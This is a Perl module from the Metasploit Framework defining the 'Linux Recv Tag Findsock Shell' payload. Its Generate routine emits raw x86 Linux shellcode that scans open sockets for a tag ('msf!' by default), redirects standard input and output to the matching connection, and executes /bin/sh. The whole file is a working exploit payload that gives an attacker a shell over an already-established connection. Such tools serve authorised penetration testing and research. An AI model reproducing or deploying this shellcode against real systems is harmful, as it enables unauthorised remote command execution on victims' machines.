package Msf::Payload::linux_ia32_findrecv;
use strict;
use base 'Msf::PayloadComponent::FindRecvConnection';

my $advanced = 
{
  'FindTag' => ['msf!', 'Tag sent and checked for by payload'],
};

my $info =
{
	'Name'         => 'Linux Recv Tag Findsock Shell',
	'Version'      => '$Revision$',
	'Description'  => 'Spawn a shell on the established connection, proxy/nat safe',
	'Authors'      => [ 'skape <mmiller [at] hick.org>', ],
	'Arch'         => [ 'x86' ],
	'Priv'         => 0,
	'OS'           => [ 'linux' ],
	'Size'         => '',
};

sub new 
{
	my $class = shift;
	my $hash = @_ ? shift : { };
	$hash = $class->MergeHash($hash, {'Info' => $info, 'Advanced' => $advanced});
	my $self = $class->SUPER::new($hash, @_);

	$self->_Info->{'Size'} = $self->_GenSize;
	return($self);
}

sub Build 
{
	my $self = shift;
	return($self->Generate);
}

sub Generate 
{
	my $self = shift;

	# Get tag and make sure its 4 bytes (pad/truncate)
	my $tag = substr($self->GetLocal('FindTag') . ("\x01" x 4), 0, 4);

	my $shellcode =
		"\x31\xdb\x53\x89\xe6\x6a\x40\xb7\x0a\x53\x56\x53\x89\xe1\x86\xfb" .
		"\x66\xff\x01\x6a\x66\x58\xcd\x80\x81\x3e\x6d\x73\x66\x21\x75\xf0" .
		"\x5f\x89\xfb\x6a\x02\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x6a\x0b" .
		"\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52" .
		"\x53\x89\xe1\xcd\x80";

	substr($shellcode, 0x1a, 4, $tag);

	return($shellcode);
}

sub _GenSize 
{
	my $self = shift;
	my $bin = $self->Generate;
	return(length($bin));
}

1;
